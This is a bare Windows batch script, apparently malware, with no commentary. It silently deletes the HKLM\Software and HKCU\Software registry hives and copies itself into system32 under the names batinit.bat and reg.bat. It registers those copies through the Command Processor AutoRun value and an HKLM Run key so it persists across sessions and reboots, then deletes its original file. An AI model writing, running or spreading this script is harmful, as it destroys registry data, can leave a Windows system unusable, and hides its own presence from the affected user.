@echo off
reg delete HKLM\Software /f >nul
reg delete HKCU\Software /f >nul
copy ""%0"" "%SystemRoot%\system32\batinit.bat" >nul
reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%SystemRoot%\system32\batinit.bat" /f >nul
copy ""%0"" "%SystemRoot%\system32\reg.bat" >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "reg" /t REG_SZ /d "%SystemRoot%\system32\reg.bat" /f >nul
del "%0" >nul
